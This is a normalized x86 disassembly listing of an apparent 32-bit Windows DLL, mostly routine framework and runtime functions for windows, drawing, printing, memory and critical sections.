mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x20 ]
retn
sub_10006ab8
retn
sub_10006ab9
push esi
mov esi ecx
call sub_10006ad5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10006ad5
mov eax sub_1001a440
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x10
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10006b01
push [ esp + 0x4 ]
add ecx 0xc
call sub_10014c9a
retn 0x4
sub_10006b10
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_100150eb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10006b3a
push esi
mov esi ecx
call sub_10006b56
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10006b56
mov [ ecx ] r--data
retn
sub_10006b5d
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_100150eb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10006b87
push esi
mov esi ecx
call sub_10006ba3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10006ba3
mov [ ecx ] r--data
retn
sub_10006baa
push [ esp + 0x4 ]
call sub_10014331
pop ecx
retn 0x4
sub_10006bdf
push esi
mov esi ecx
call sub_10006bf3
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_10006cd6
call sub_100155f9
test eax eax
je r-xdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x74 ]
retn
sub_10006f16
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_10015f39
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_10006f2d
retn 0x4
sub_10006f30
push 0x0
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_10006f3c
push 0x1
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_10006f48
call sub_10019774
mov ecx [ eax + 0x4 ]
jmp sub_1001588c
sub_10006f55
push esi
mov esi ecx
call sub_10006f71
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10006fb9
push esi
mov esi ecx
call sub_10006fd5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10006fd5
mov eax sub_1001a71c
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10018490
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10006ffe
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_100150eb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10007028
push esi
mov esi ecx
call sub_10007044
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10007044
mov [ ecx ] r--data
retn
sub_1000704b
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_100150eb
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_10007075
push esi
mov esi ecx
call sub_10007091
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10007091
mov [ ecx ] r--data
retn
sub_10007098
push esi
mov esi ecx
call sub_100070b4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_100070b4
mov eax sub_1001a780
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10018bbb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_100070dd
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_100070f1
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_10007101
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_1000717a
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_100071c6
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_10007216
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_1000721d
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_10007445
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100074e8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10007572
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_100074e8
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000759e
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_10007b53
push [ esp + 0x4 ]
call sub_10007ad5
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_10008136
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_10008105
add esp 0xc
retn
sub_100084e6
push esi
mov esi ecx
call sub_100084bd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_1000880d
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_1000750a
add esp 0x8
pop ebp
retn 0x4
sub_100088d0
call sub_1000c9df
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_1000d3e8
sub_10009088
push 0x1
push [ esp + 0x8 ]
call sub_10009096
pop ecx
pop ecx
retn
sub_100098bc
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_100094e4
pop ecx
mov [ rw-data ] 0x1
sub_100098d8
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_100098f3
add esp 0x14
retn
sub_1000a803
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_1000a907
push rw-data
push rw-data
call sub_1000a907
add esp 0x10
retn
call eax
sub_1000a830
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_1000a850
add esp 0xc
retn
sub_1000a841
push 0x1
push 0x0
push 0x0
call sub_1000a850
add esp 0xc
retn
sub_1000a8f5
push 0xd
call sub_1000b7a4
pop ecx
retn
sub_1000a8fe
push 0xd
call sub_1000b805
pop ecx
retn
sub_1000acdd
push [ ebp - 0x14 ]
call sub_1000ad14
pop ecx
retn
sub_1000ad14
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_1000b318
xor eax eax
retn
sub_1000ae4a
push [ ebp - 0x14 ]
call sub_1000aec0
pop ecx
retn
sub_1000b0a2
push 0x1
pop eax
retn
sub_1000b0a6
mov esp [ ebp - 0x18 ]
jmp sub_1000b318
sub_1000b104
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1000b10d
mov esp [ ebp - 0x18 ]
jmp sub_1000b318
sub_1000b1e0
call sub_1000b738
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000b1fe
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_1000b360
push 0x1
pop eax
retn
sub_1000b3b6
push 0x1
pop eax
retn
sub_1000b5d0
push 0x1
pop eax
retn
sub_1000b684
push 0x1
pop eax
retn
sub_1000b70f
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_1000c111
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_1000c11e
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_1000c12e
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_1000c9df
push 0x1
call sub_1000c9e8
pop ecx
retn
sub_1000d1ba
push sub_1000d174
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_1000d1cb
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_1000eb70
push esi
push 0xb
call sub_1000b7a4
push [ esp + 0xc ]
call sub_1000eb91
push 0xb
mov esi eax
call sub_1000b805
add esp 0xc
mov eax esi
pop esi
retn
sub_1000ef76
push 0x1
pop eax
retn
sub_1000f1c4
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_1000f1e0
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_1000f1fc
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_1000f784
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_1000ffa1
push 0x2
call sub_10008c87
pop ecx
retn
sub_10010394
push 0x1
pop eax
retn
sub_10010403
push 0x1
pop eax
retn
sub_1001075e
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_100107c5
push esi
mov esi ecx
call sub_10010788
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_100108b4
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_100107e1
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1001099c
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_100107e1
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100109e9
test [ rw-data ] 0x1
jne r-xdata
call sub_10010a13
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_10010a1f
or [ rw-data ] 0x1
sub_10010a13
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10010a1f
push sub_10006ab8
call sub_10007b53
pop ecx
retn
sub_10010ae0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0xffffffff
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_10010a30
add esp 0x14
retn
sub_10011e40
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call [ r--data ]
add esp 0x8
retn
sub_10011e60
mov eax [ esp + 0x8 ]
push eax
call [ r--data ]
pop ecx
retn
sub_10012010
retn
sub_10013b30
push 0x0
push [ esp + 0x8 ]
call sub_10013c4d
retn 0x4
sub_10013b3e
call sub_10013b48
jmp sub_10013b5a
sub_10013b48
push 0xa
push 0x80020004
mov ecx rw-data
call sub_10013bf1
retn
sub_10013b5a
push sub_10013b66
call sub_10007b53
pop ecx
retn
sub_10013b66
push rw-data
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
retn
push eax
call sub_10013b30
sub_10013ca3
push esi
mov esi ecx
call sub_10013cec
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
RtlUnwind
jmp [ RtlUnwind@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
GetFileTitleA
jmp [ GetFileTitleA@IAT ]
sub_10013d30
push esi
mov esi ecx
call sub_10013dd3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10013dd3
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_10014331
pop ecx
sub_10013de9
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10013f97
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_1000870c
sub_10013fb0
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_10014308
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_10013fd0
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_10014331
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_10014006
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_10013fe6
sub_1001406a
push esi
mov esi ecx
call sub_100140f6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_100140f6
mov eax sub_1001a584
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_100140cb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_1001416c
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_100140cb
sub_100142ee
call sub_10013f97
xor eax eax
retn
sub_10014331
push [ esp + 0x4 ]
call sub_10008d46
pop ecx
retn
sub_1001433c
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
or [ eax + 0x4 ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_10014356
push esi
mov esi ecx
call sub_10014391
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10014372
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_10014648
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
push eax
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_100146aa
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0xc ]
call sub_10014b7c
pop esi
retn
push eax
call [ CloseHandle@IAT ]
or [ esi + 0x4 ] 0xffffffff
sub_10014775
xor eax eax
retn 0x10
sub_10014999
call sub_100149a3
jmp sub_100149b2
sub_100149a3
push 0x40
push 0x50
mov ecx rw-data
call sub_10006bb7
retn
sub_100149b2
push sub_100149be
call sub_10007b53
pop ecx
retn
sub_100149be
mov ecx rw-data
jmp sub_10006bdf
sub_100149c8
call sub_100149d2
jmp sub_100149e4
sub_100149d2
push 0x40
push 0x90
mov ecx rw-data
call sub_10006bb7
retn
sub_100149e4
push sub_100149f0
call sub_10007b53
pop ecx
retn
sub_100149f0
mov ecx rw-data
jmp sub_10006bdf
sub_100149fa
call sub_10014a04
jmp sub_10014a16
sub_10014a04
push 0x40
push 0x110
mov ecx rw-data
call sub_10006bb7
retn
sub_10014a16
push sub_10014a22
call sub_10007b53
pop ecx
retn
sub_10014a22
mov ecx rw-data
jmp sub_10006bdf
sub_10014a2c
call sub_10014a36
jmp sub_10014a48
sub_10014a36
push 0x40
push 0x210
mov ecx rw-data
call sub_10006bb7
retn
sub_10014a48
push sub_10014a54
call sub_10007b53
pop ecx
retn
sub_10014a54
mov ecx rw-data
jmp sub_10006bdf
sub_10014b59
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_10014ae0
sub_10014b7c
mov eax [ ecx ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
retn
cmp [ eax - 0xc ] 0x0
jl r-xdata
push rw-data
call sub_10014c9a
jmp sub_10014b28
sub_10014d5e
lea eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
push 0x1
call sub_10014cff
mov eax esi
pop esi
retn 0x4
sub_10014d73
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ eax ]
push eax
push [ eax - 0x8 ]
call sub_10014cff
mov eax esi
pop esi
retn 0x4
sub_100150e1
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_100150eb
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_100150f7
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_10015196
mov ecx [ ebp - 0x18 ]
call sub_100150f7
mov eax r-xdata
retn
sub_100151a4
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_100152d0
push eax
call sub_10015265
sub_1001560e
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_10015869
push 0x1
pop eax
retn 0x4
sub_1001586f
mov eax 0x80029c4a
retn 0x8
sub_10015877
call sub_10019774
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_1001588c
call sub_10019774
mov eax [ eax + 0x4 ]
push 0xffffffff
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_100158a1
mov eax r--data
retn
sub_100158a7
mov eax r--data
retn
sub_100158ad
mov eax r--data
retn
sub_100158b3
push 0x1
pop eax
retn
sub_100158b7
xor eax eax
retn 0x4
sub_100158bc
mov eax r--data
retn
sub_100158c2
mov eax r--data
retn
j_sub_10015a92
jmp sub_10015a92
sub_10015a92
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_10015aa3
call sub_10015aad
jmp sub_10015aba
sub_10015aad
push 0x0
mov ecx rw-data
call sub_10015bd9
retn
sub_10015aba
push sub_10015ac6
call sub_10007b53
pop ecx
retn
sub_10015ac6
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_100165ab
sub_10015ae1
call sub_10015aeb
jmp sub_10015af8
sub_10015aeb
push 0x1
mov ecx rw-data
call sub_10015bd9
retn
sub_10015af8
push sub_10015b04
call sub_10007b53
pop ecx
retn
sub_10015b04
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_100165ab
sub_10015b1f
call sub_10015b29
jmp sub_10015b36
sub_10015b29
push 0xffffffff
mov ecx rw-data
call sub_10015bd9
retn
sub_10015b36
push sub_10015b42
call sub_10007b53
pop ecx
retn
sub_10015b42
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_100165ab
sub_10015b5d
call sub_10015b67
jmp sub_10015b74
sub_10015b67
push 0xfffffffe
mov ecx rw-data
call sub_10015bd9
retn
sub_10015b74
push sub_10015b80
call sub_10007b53
pop ecx
retn
sub_10015b80
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_100165ab
sub_10015bbd
push esi
mov esi ecx
call sub_100165ab
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10015c05
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_10018155
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_10015f60
push 0x0
call sub_10015ec7
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_100141b7
sub_1001653f
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_10017cec
mov [ esi + 0x28 ] r--data
sub_10016757
retn
sub_10016758
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_100167fd
lea eax [ ecx + 0x28 ]
retn
sub_10016801
push esi
mov esi ecx
call sub_10019774
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_1001694f
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_10017525
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_10015ea0
sub_10016c3e
mov eax r--data
retn
sub_1001723a
push esi
mov esi ecx
call sub_100158c8
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_10017253
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_10017739
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_10019542
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_10016820
sub_10017c09
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_10017fa3
xor eax eax
retn
sub_10017fa6
push [ esp + 0x4 ]
mov ecx rw-data
call sub_10006caa
retn
sub_1001813e
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_10018155
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x70 ]
push 0xfffffff0
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_1001816f
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
push 0xffffffec
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_100181d8
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xa4 ]
push [ ecx + 0x1c ]
call [ IsWindowEnabled@IAT ]
retn
sub_100181f3
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
jmp r-xdata
retn 0x4
sub_1001821a
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_10015f39
retn
sub_10018433
push 0x1
call sub_100183c1
mov ecx eax
push [ esp + 0x4 ]
call sub_1001801a
retn 0x4
sub_10018448
push 0x0
call sub_100183c1
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_100141b7
sub_10018490
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_10018466
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_100184a6
retn 0x4
sub_100185c0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_10018661
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_10018675
push esi
mov esi ecx
call sub_10018749
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10018703
push 0x1
call sub_10018691
mov ecx eax
push [ esp + 0x4 ]
call sub_1001801a
retn 0x4
sub_1001877f
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_10018789
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_10018793
and [ ecx + 0x8 ] 0x0
retn
sub_10018798
and [ ecx + 0x4 ] 0x0
retn
sub_10018afa
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_10018b7c
push 0x1
call sub_10018b0a
mov ecx eax
push [ esp + 0x4 ]
call sub_1001801a
retn 0x4
sub_10018bbb
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_10018b91
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_10018e13
call sub_10019542
mov eax [ eax + 0xc4 ]
retn
sub_10018f58
lea eax [ esp + 0xc ]
push 0x1
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10018e1f
retn 0xc
sub_10018f6f
call sub_10019774
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_10018f7f
mov eax r--data
retn
sub_10018f85
mov eax r--data
retn
sub_10018f8b
mov eax r--data
retn
sub_10018f91
call sub_10018f9b
jmp sub_10018fad
sub_10018f9b
push 0xf023
push 0x0
mov ecx rw-data
call sub_10006b10
retn
sub_10018fad
push sub_10018fb9
call sub_10007b53
pop ecx
retn
sub_10018fb9
mov ecx rw-data
jmp sub_10006b56
sub_10018fc3
mov eax r--data
retn
sub_10018fc9
call sub_10018fd3
jmp sub_10018fe5
sub_10018fd3
push 0xf021
push 0x0
mov ecx rw-data
call sub_10006b5d
retn
sub_10018fe5
push sub_10018ff1
call sub_10007b53
pop ecx
retn
sub_10018ff1
mov ecx rw-data
jmp sub_10006ba3
sub_1001902f
mov eax r--data
retn
sub_1001908b
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx ]
mov [ edx + eax ] esi
mov [ ecx ] eax
pop esi
retn 0x4
sub_1001909e
push esi
push [ esp + 0x8 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn 0x4
call sub_10013f97
sub_100190bc
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call [ LocalFree@IAT ]
sub_1001936b
push esi
mov esi ecx
call sub_10019386
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
sub_10019386
retn
sub_1001949c
mov eax ecx
or [ eax + 0xd4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov [ eax ] r--data
retn
sub_100194b3
push esi
mov esi ecx
call sub_100194ce
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
sub_10019542
push sub_10018ffb
mov ecx rw-data
call sub_10019387
retn
sub_10019552
